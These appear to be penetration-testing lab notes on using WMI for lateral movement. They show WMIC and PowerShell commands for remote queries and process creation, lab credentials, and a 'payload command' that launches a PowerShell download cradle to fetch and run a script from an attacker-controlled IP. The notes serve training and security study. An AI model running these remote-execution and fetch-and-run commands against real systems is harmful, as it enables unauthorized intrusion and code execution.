**Windows Management Instrumentation (WMI)** is a Microsoft technology used for querying and controlling Windows systems. It allows remote command execution, system information retrieval, service manipulation, and moreâ€”making it a powerful vector for **lateral movement**.

- WMI uses TCP port 135 for the initial connection and dynamic ports in the range 49152-65535 for subsequent communication
- We retrieve detailed information about the operating system from a remote computer, we can use the following WMIC command

```
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 172.20.0.52 | Select-Object Caption, CSDVersion, OSArchitecture, Version
```
- WMI also allows for executing commands remotely. This capability is particularly useful for administrative tasks such as starting or stopping processes, running scripts, or changing system configurations without direct machine access

```
wmic /node:172.20.0.52 process call create "notepad.exe"
```

```
Invoke-WmiMethod -Class Win32_Process -Name Create ArgumentList "notepad.exe" -ComputerName 172.20.0.52
```

- we can also **authenticate with credentials** when using **WMI**
```
wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
```
- Payload command
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52
```


### Lateral Movement From Linux
- We need to install wmi-client
- We can also use impacket wmiexec.py
- We can use NetExec to run WMI queries or execute commands using WMI. To perform a query we can use the option --wmi To execute commands we can use the protocol wmi with the option impacket -x
```
wmic -U inlanefreight.local/helen%RedRiot88 //172.20.0.52 "SELECT Caption, CSDVersion, OSArchitecture, Version FROM Win32_OperatingSystem
```

